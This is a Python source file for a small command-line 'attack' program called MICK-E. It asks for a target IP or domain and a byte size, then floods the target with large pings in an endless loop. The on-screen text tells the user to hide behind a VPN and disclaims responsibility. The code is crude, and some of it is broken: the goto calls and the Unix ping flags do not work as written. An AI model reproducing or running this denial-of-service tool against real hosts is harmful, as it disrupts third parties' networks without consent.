import os
import keyboard
import colored
from goto_py import goto
from colorama import init, Fore, Back, Style
import time
import getpass

# Variable defs
def cls():
    os.system('cls' if os.name=='nt' else 'clear')

Link=f"\n   {Back.WHITE}{Fore.BLACK}Download the program at https://github.com/variouz/MICK-E{Style.RESET_ALL}"
logoLine="   _______________________________________________________________________"
startPoint=f"""
             {Fore.CYAN}.-```-.
            {Fore.CYAN}/       \      {Fore.WHITE} \   | _ _|  ___| |  /        ____|
            {Fore.CYAN}\       /      {Fore.WHITE} |\/ |   |  |     | /         __|
     {Fore.CYAN}.-```-.-`.-.-.<       {Fore.WHITE} |   |   |  |     . \ _____|  |
    {Fore.CYAN}/      _,-\ ()()_/:)   {Fore.WHITE}_|  _| ___|\____|_|\_\       _____|
    {Fore.CYAN}\     / ,  `     `|
     {Fore.CYAN}'-..-| \-.,___,  /		   MADE BY VARIOUZ
           {Fore.CYAN}\ `-.__/  /
            {Fore.CYAN}`-.__.-'`{Style.RESET_ALL}
            """
Continue="\n   [Enter] Continue [Ctrl-C] Exit"

# Start of program

cls()
print(Link)
print(logoLine)
print(startPoint)
print(logoLine)
print(Continue)
getpass.getpass("\n   ")
cls()

#Grab user input for hostname
print(f" \n   {Fore.CYAN}Enter IP or domain name:{Style.RESET_ALL}\n")
hostname=input("   ")
cls()

#Grab user input for amount of bytes
print(f"\n   {Fore.CYAN}Enter the amount of bytes to attack with (over 1512B seems to break):{Style.RESET_ALL}\n")
amount=input("   ")
if amount.isnumeric():
    while 1==1:
        cls()
        response=os.system(f"ping {hostname}" if os.name=="nt" else f"ping {hostname}")
        cls()
        if response == 0:
            print(Link)
            print(f"\n   {Fore.CYAN}Now running attack on {hostname} with {amount} bytes...\n")
            print(f"\n   {Fore.WHITE}Kid, make sure you use a VPN. Please note that we are not accountable for your dumb decisions.\n")
            print(f"\n   {Back.RED}Please note that we are not accountable for your dumb decisions.{Style.RESET_ALL}")
            print(f"""\n   {Fore.WHITE}How about a story of this things creation while you wait? I made this program as a test to myself
            on mhy capabilities with OS and exception in Python around November of 2021. How's about that?""")
            os.system(f"ping {hostname} -l {amount} -t" if os.name=="nt" else f"ping -s {amount} -c {hostname} ")
        else:
            cls()
            print(f"\n   {Fore.RED}Wrong hostname or number entered. Restarting...")
            time.sleep(3)
            goto(1)
else:
    cls()
    print(f"\n   {Back.RED}Wrong hostname or number entered. Restarting...")
    time.sleep(3)
    goto(1)
